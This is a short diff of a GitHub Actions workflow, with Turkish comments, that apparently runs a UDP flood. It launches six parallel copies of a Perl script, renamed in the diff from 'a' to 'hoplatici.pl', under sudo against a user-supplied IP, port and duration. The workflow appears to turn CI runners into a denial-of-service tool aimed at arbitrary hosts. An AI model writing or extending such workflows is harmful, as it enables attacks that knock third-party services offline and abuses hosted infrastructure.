@@ -62,7 +62,7 @@ jobs:
             echo "UDP method seçildi"
 
              for i in {1..6}; do
-               sudo perl a ${{ inputs.ip }} ${{ inputs.port }} 1024 ${{ inputs.time }} &
+               sudo perl hoplatici.pl ${{ inputs.ip }} ${{ inputs.port }} 1024 ${{ inputs.time }} &
                PIDS+=($!)
              done
 
